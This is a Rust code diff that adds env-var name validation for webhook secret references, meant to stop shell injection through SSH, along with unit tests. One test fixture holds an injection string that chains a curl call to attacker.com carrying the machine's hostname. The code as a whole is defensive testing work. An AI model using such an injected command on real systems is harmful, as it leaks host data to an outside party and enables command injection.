@@ -1316,6 +1316,26 @@ pub fn warn_if_world_readable(path: &std::path::Path) {
     }
 }
 
+/// Validate that an environment variable name contains only safe characters.
+///
+/// POSIX env-var names must match `[A-Za-z_][A-Za-z_0-9]*`. Rejecting
+/// anything else prevents shell injection when the name is interpolated
+/// into a remote SSH command.
+pub fn is_valid_env_var_name(name: &str) -> bool {
+    if name.is_empty() {
+        return false;
+    }
+    let mut chars = name.chars();
+    let first = match chars.next() {
+        Some(c) => c,
+        None => return false,
+    };
+    if !first.is_ascii_alphabetic() && first != '_' {
+        return false;
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 /// Validate that a webhook secret is not a hardcoded hex string.
 ///
 /// Hardcoded secrets in config files are a P1 security risk: they end up in
@@ -1323,10 +1343,25 @@ pub fn warn_if_world_readable(path: &std::path::Path) {
 /// like generated HMAC keys (hexadecimal, 32+ characters) unless they use
 /// the `${VAR_NAME}` env-var reference syntax.
 ///
+/// Env-var references are validated to contain only safe characters
+/// (`[A-Za-z_][A-Za-z_0-9]*`) to prevent shell injection when the name
+/// is later resolved via SSH in `adf-ctl`.
+///
 /// Passphrases and short test keys are still allowed.
 pub fn validate_webhook_secret(secret: &str) -> Result<(), crate::error::OrchestratorError> {
-    // Env-var references are the approved pattern.
+    // Env-var references are the approved pattern, but validate the name.
     if secret.starts_with("${") && secret.ends_with("}") {
+        let var_name = &secret[2..secret.len() - 1];
+        if !is_valid_env_var_name(var_name) {
+            return Err(crate::error::OrchestratorError::Config(
+                format!(
+                    "webhook.secret env-var reference '${{{}}}' contains invalid characters. \
+                     Only alphanumeric characters and underscores are allowed \
+                     ([A-Za-z_][A-Za-z_0-9]*).",
+                    var_name
+                )
+            ));
+        }
         return Ok(());
     }
     // Reject hex strings that look like hardcoded cryptographic keys.
@@ -3552,6 +3587,57 @@ task = "t"
 "#;
         let config = OrchestratorConfig::from_toml(toml_str).unwrap();
         assert!(config.validate().is_ok(), "config with env-var webhook secret must pass validation");
+    }
+
+    // === P1: Shell injection prevention in env-var references ===
+
+    #[test]
+    fn webhook_secret_env_var_injection_rejected() {
+        // The exact attack vector from the security finding
+        let malicious = "${ADF_SECRET}; curl https://attacker.com/$(hostname)}";
+        let result = validate_webhook_secret(malicious);
+        assert!(result.is_err(), "injection in env-var name must be rejected");
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("invalid characters"),
+            "error should explain the rejection: {err}"
+        );
+    }
+
+    #[test]
+    fn webhook_secret_env_var_empty_name_rejected() {
+        assert!(
+            validate_webhook_secret("${}").is_err(),
+            "empty env-var name must be rejected"
+        );
+    }
+
+    #[test]
+    fn webhook_secret_env_var_digit_start_rejected() {
+        assert!(
+            validate_webhook_secret("${1BAD}").is_err(),
+            "digit-starting env-var name must be rejected"
+        );
+    }
+
+    #[test]
+    fn webhook_secret_env_var_hyphen_rejected() {
+        assert!(
+            validate_webhook_secret("${MY-SECRET}").is_err(),
+            "hyphen in env-var name must be rejected"
+        );
+    }
+
+    #[test]
+    fn is_valid_env_var_name_comprehensive() {
+        assert!(is_valid_env_var_name("ADF_WEBHOOK_SECRET"));
+        assert!(is_valid_env_var_name("_underscore"));
+        assert!(is_valid_env_var_name("a"));
+        assert!(!is_valid_env_var_name(""));
+        assert!(!is_valid_env_var_name("1start"));
+        assert!(!is_valid_env_var_name("has space"));
+        assert!(!is_valid_env_var_name("has;semi"));
+        assert!(!is_valid_env_var_name("has|pipe"));
     }
 
     #[test]
